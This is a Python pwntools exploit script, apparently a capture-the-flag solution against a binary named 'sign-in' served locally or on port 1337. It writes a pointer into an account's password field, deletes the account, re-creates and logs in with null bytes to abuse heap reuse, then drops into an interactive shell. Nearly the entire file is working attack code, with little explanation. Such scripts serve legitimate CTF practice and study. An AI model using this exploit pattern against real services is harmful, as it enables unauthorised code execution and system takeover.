#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './sign-in' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
libc = '/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '', 1337 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
# break *remove_account+122
# break *remove_account+134
# break *remove_account
# break *sign_in
# break *0x40159b
# break *0x401610
# break *0x40159f
# break *0x4014d1
'''.format(**locals())


# =========================================================
#                         NOTES
# =========================================================

def create_account(username, password):
    io.sendlineafter('> ', '1')
    io.sendafter('username: ', username)
    io.sendafter('password: ', password)
    
def delete_account(username, password):
    io.sendlineafter('> ', '2')
    io.sendafter('username: ', username)
    io.sendafter('password: ', password)
    io.sendlineafter('> ', '3')
    
def login(username, password):
    io.sendlineafter('> ', '2')
    io.sendafter('username: ', username)
    io.sendafter('password: ', password)



# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)
    
    pointer = 0x402eb8
    info(f'bss: {hex(pointer)}')
    create_account(b'AAAA', p64(pointer))
    delete_account(b'AAAA', p64(pointer))
    create_account(b'CCCC', b'CCCC')
    login(p64(0), p64(0))
    
    io.sendline(b'4')
    

    io.interactive()
    
if __name__ == '__main__':
    exploit()